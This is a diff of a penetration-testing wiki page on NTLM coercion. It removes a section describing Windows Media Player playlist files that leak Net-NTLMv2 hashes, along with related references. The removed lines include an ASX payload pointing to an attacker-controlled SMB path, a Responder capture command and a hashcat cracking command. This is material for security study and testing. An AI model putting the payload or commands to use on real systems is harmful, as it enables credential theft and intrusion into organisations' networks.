@@ -160,38 +160,6 @@ There are several ways to **force NTLM authentication "remotely"**, for example,
 ../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
 {{#endref}}
 
-### Windows Media Player playlists (.ASX/.WAX) to coerce NTLM
-
-If a workflow automatically previews media (e.g., HR reviewing uploads) using Windows Media Player, you can leak Net-NTLMv2 by providing a playlist that references a UNC path. When WMP loads the entry, it attempts SMB access with implicit NTLM authentication.
-
-Example ASX payload (also supported by .WAX):
-
-```xml
-<asx version="3.0">
-  <title>Leak</title>
-  <entry>
-    <title></title>
-    <ref href="file://10.10.14.148\test\pwn.mp3" />
-  </entry>
-</asx>
-```
-
-Collect and crack the hash:
-
-```bash
-# Capture Net-NTLMv2
-sudo Responder -I <iface>
-# Or run via uv if you manage dependencies with it
-# sudo uv run --script Responder.py -I <iface>
-
-# Crack (hashcat auto-detects NetNTLMv2, mode 5600)
-hashcat ntlm.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
-```
-
-Notes
-- Use ntlm_theft to generate ready-made WMP coercion files: https://github.com/Greenwolf/ntlm_theft
-- If NTLM signing/SMB egress is blocked or NTLM disabled, this won’t work. Otherwise, it’s effective when targets auto-open or preview uploaded playlists.
-
 ### NTLM Relay
 
 Don't forget that you cannot only steal the hash or the authentication but also **perform NTLM relay attacks**:
@@ -260,9 +228,5 @@ Check the page about **places to steal NTLM creds**:
 
 - [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
 - [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
-- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
-- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
-- [ntlm_theft – NTLM coercion file generator](https://github.com/Greenwolf/ntlm_theft)
-- [Responder](https://github.com/lgandx/Responder)
 
 {{#include ../../banners/hacktricks-training.md}}
